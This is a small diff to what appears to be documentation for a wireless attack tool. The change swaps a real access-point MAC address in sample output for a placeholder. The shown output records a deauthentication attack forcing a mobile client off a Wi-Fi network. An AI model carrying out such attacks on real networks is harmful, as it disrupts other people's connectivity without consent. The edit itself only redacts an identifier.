@@ -256,7 +256,7 @@
     Enter the gateway (AP) MAC address: WIFI_MAC
     [+] Initiating Deauthentication attack on MOBILE_MAC via WIFI_MAC using wlan0
     [+] Starting deauthentication attack on MOBILE_MAC via WIFI_MAC using wlan0
-    23:31:45  Waiting for beacon frame (BSSID: D8:47:32:79:B5:44) on channel 36
+    23:31:45  Waiting for beacon frame (BSSID: WIFI_MAC) on channel 36
     23:31:45  Sending 64 directed DeAuth (code 7). STMAC: [MOBILE_MAC] [51|69 ACKs]
     23:31:46  Sending 64 directed DeAuth (code 7). STMAC: [MOBILE_MAC] [ 0|63 ACKs]
     23:31:47  Sending 64 directed DeAuth (code 7). STMAC: [MOBILE_MAC] [ 0|63 ACKs]
